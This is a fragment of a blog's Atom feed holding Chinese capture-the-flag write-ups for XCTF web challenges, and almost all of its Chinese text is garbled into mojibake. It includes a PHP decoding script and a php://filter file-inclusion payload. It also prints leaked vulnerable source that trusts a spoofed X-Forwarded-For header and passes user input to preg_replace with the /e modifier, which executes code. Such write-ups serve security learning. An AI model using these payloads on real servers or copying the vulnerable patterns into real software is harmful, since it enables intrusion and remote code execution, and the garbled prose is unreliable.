class="line">      document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure><ul><li><p>æ–°å‡½æ•°ï¼š</p><p><strong>splice()</strong> </p><p>åŠŸèƒ½ï¼šä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚</p><p>è¯­æ³•ï¼š<code>arrayObject.splice(index,howmany,item1,.....,itemX)</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">index</td><td align="left">å¿…éœ€ã€‚æ•´æ•°ï¼Œè§„å®šæ·»åŠ /åˆ é™¤é¡¹ç›®çš„ä½ç½®ï¼Œä½¿ç”¨è´Ÿæ•°å¯ä»æ•°ç»„ç»“å°¾å¤„è§„å®šä½ç½®ã€‚</td></tr><tr><td align="left">howmany</td><td align="left">å¿…éœ€ã€‚è¦åˆ é™¤çš„é¡¹ç›®æ•°é‡ã€‚å¦‚æœè®¾ç½®ä¸º 0ï¼Œåˆ™ä¸ä¼šåˆ é™¤é¡¹ç›®ã€‚</td></tr><tr><td align="left">item1, â€¦, itemX</td><td align="left">å¯é€‰ã€‚å‘æ•°ç»„æ·»åŠ çš„æ–°é¡¹ç›®ã€‚</td></tr></tbody></table></li></ul><p>æ³•1ï¼šè¾“å…¥ç¬¦åˆæ¡ä»¶çš„<code>e</code>ï¼Œä»¤å…¶æ‰§è¡Œåç»­ä»£ç </p><ul><li><p>æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><p>^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aaï¼Œå…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±å¥½ï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚<br>äºæ˜¯æˆ‘ä»¬æ„é€ eçš„å€¼ï¼š<code>be0f233ac7be98aa</code></p></li></ul><p>åœ¨è¾“å…¥æ¡†å†…è¾“å…¥eçš„å€¼ï¼š</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/image-20210327221653190.png" alt="image-20210327221653190"></p><p>æ³•2ï¼šç›´æ¥çœ‹ååŠæ®µæºç ï¼Œå¾ªç¯æ¨ç†ä¹Ÿå¯å¾—eçš„å€¼ã€‚ä½†æ˜¯æˆ‘æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ã€‚</p><h1 id="web2ï¼šï¼ˆè§£ç ï¼‰"><a href="#web2ï¼šï¼ˆè§£ç ï¼‰" class="headerlink" title="web2ï¼šï¼ˆè§£ç ï¼‰"></a>web2ï¼šï¼ˆè§£ç ï¼‰</h1><p>ç‚¹å¼€é¢˜ç›®åœ°å€ï¼š</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2\4.png" alt="4"></p><p>å‘ç°è¿™æ˜¯ä¸€é“è§£ç é¢˜ï¼Œåªè¦è§£å‡ºmiwençš„å€¼ï¼Œå°±å¾—åˆ°flag</p><ul><li><p>æ–°å‡½æ•°ï¼š</p><p><strong>strrev()å‡½æ•°ï¼š</strong></p><p>åŠŸèƒ½ï¼šåè½¬å­—ç¬¦ä¸²ã€‚</p><p>è¯­æ³•ï¼šstrrev(string)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¦åè½¬çš„å­—ç¬¦ä¸²ã€‚</td></tr></tbody></table></li></ul><p>  <strong>ord()å‡½æ•°ï¼š</strong></p><p>  åŠŸèƒ½ï¼šä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼ã€‚å³ä¸€ä¸ªè¿”å›ä¸€ä¸ªå¯¹åº”çš„åè¿›åˆ¶æ•°ã€‚</p><p>  è¯­æ³•ï¼šord(c)</p><p>  <strong>char()å‡½æ•°ï¼š</strong></p><p>  åŠŸèƒ½ï¼šæ ¹æ®æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ï¼ˆASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚ï¼‰</p><p>  è¯­æ³•ï¼šchr(ascii)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>ascii</em></td><td>å¿…éœ€ã€‚ASCII å€¼ã€‚</td></tr></tbody></table><p>  <strong>str_rot13()å‡½æ•°ï¼š</strong></p><p>  åŠŸèƒ½ï¼šå¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚ROT13 ç¼–ç æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚</p><p>  è¯­æ³•ï¼šstr_rot13(string)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¦ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</td></tr></tbody></table><p>  spï¼šå¯¹å­—ç¬¦ä¸²è§£ç å’Œç¼–ç éƒ½æ˜¯åŒä¸€ä¸ªå‡½æ•°</p><p>ä»£ç å®¡è®¡ï¼šå…ˆåè½¬å­—ç¬¦ä¸²ï¼Œç„¶åå¯¹å­—ç¬¦ä¸²æ¯ä¸ªå­—æ¯å¯¹åº”çš„ascllç å€¼åŠ ä¸€ï¼Œå†æ‰¾åˆ°åŠ å€¼å¯¹åº”çš„ascllç ï¼ŒæŠŠæ¯ä¸ªå­—ç¬¦å†æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ</p><p>ç„¶åå¯¹è¯¥å­—ç¬¦ä¸²ä¾æ¬¡è¿›è¡Œbase64ç¼–ç ã€åè½¬ã€ ROT13 ç¼–ç ï¼Œç»“æœå°±æ˜¯è¾“å‡ºçš„miwençš„å€¼ã€‚</p><p>æ®æ­¤æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€æ®µphpä»£ç è¿›è¡Œè§£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line"></span><br><span class="line">$_o=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_);$_0++)&#123;  </span><br><span class="line">     </span><br><span class="line">    $_c=substr($_,$_0,<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">    $__=ord($_c)<span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">    $_c=chr($__);  </span><br><span class="line"></span><br><span class="line">    $_o=$_o.$_c;   </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> strrev($_o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2\5.png" alt="5"></p><h1 id="ics-05ï¼šï¼ˆhttp-filteråˆ©ç”¨-preg-replace-å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰"><a href="#ics-05ï¼šï¼ˆhttp-filteråˆ©ç”¨-preg-replace-å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰" class="headerlink" title="ics-05ï¼šï¼ˆhttp://filteråˆ©ç”¨+preg_replace()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰"></a>ics-05ï¼šï¼ˆ<code>http://filter</code>åˆ©ç”¨+preg_replace()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰</h1><p>æˆ‘ä»¬çœ‹åˆ°é¢˜ç›®æè¿°ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2\6.png" alt="6"></p><p>ç‚¹å¼€é¢˜ç›®åœ°å€ï¼Œæ‰¾åˆ°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2\7.png" alt="7"></p><p>å‘ç°æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php://filterè¯»å–index.phpæºç ï¼š<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2\8.png" alt="8"></p><p>å¯¹è·å¾—çš„å­—ç¬¦ä¸²è¿›è¡Œbase64-decodeï¼Œå¾—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">    &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;å¼€|å…³&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;table&#39;, function() &#123;</span><br><span class="line">        var table &#x3D; layui.table,</span><br><span class="line">            form &#x3D; layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#39;#test&#39;,</span><br><span class="line">            url: &#39;&#x2F;somrthing.json&#39;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#39;numbers&#39; &#125;,</span><br><span class="line">                     &#123; type: &#39;checkbox&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;name&#39;, title: &#39;è®¾å¤‡å&#39;, templet: &#39;#nameTpl&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;area&#39;, title: &#39;åŒºåŸŸ&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;status&#39;, title: &#39;ç»´æŠ¤çŠ¶æ€&#39;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;check&#39;, title: &#39;è®¾å¤‡å¼€å…³&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;element&#39;, function() &#123;</span><br><span class="line">        var element &#x3D; layui.element; &#x2F;&#x2F;å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å—</span><br><span class="line">        &#x2F;&#x2F;ç›‘å¬å¯¼èˆªç‚¹å‡»</span><br><span class="line">        element.on(&#39;nav(demo)&#39;, function(elem) &#123;</span><br><span class="line">            &#x2F;&#x2F;console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page &#x3D; $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;input&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">                    die(&#39;Ok&#39;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>å…¶ä¸­æœ€å…³é”®çš„ä»£ç å†…å®¹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼šå½“æœåŠ¡å™¨æ”¶åˆ°æ¥è‡ªip=127.0.0.1çš„è®¿é—®è¯·æ±‚æ—¶ï¼Œä¼šè®¤ä¸ºå…¶æ˜¯ç®¡ç†å‘˜ã€‚æ­¤æ—¶å¯ä»¥ä¼´éšä¸Šä¼ ä¸‰ä¸ªå‚æ•°ï¼Œä½œä¸ºpreg_replace()å‡½æ•°çš„å˜é‡ã€‚</p><p><strong>å­¦ä¹ ï¼š</strong></p><p>preg_replace()å‡½æ•°å±é™©çš„/eä¿®é¥°ç¬¦ï¼ˆ<a href="https://www.jb51.net/article/38714.htm%EF%BC%89">https://www.jb51.net/article/38714.htmï¼‰</a></p><p>è¯´æ˜ï¼š/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚</p><p><strong>preg_replace($pattern, $replacement, $subject)</strong><br>ä½œç”¨ï¼šæœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementçš„å†…å®¹è¿›è¡Œæ›¿æ¢ã€‚<br>$pattern:             è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$replacement:   ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$subject:             è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NewsCenter&quot;&gt;&lt;a href=&quot;#NewsCenter&quot; class=&quot;headerlink&quot; title=&quot;NewsCenter&quot;&gt;&lt;/a&gt;NewsCenter&lt;/h1&gt;&lt;h1 id=&quot;Web-php-unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”Weak Session IDs</title>
    <link href="http://example.com/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/"/>
    <id>http://example.com/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/</id>
    <published>2021-03-12T08:50:01.000Z</published>
    <updated>2021-03-13T02:25:32.044Z</updated>
    
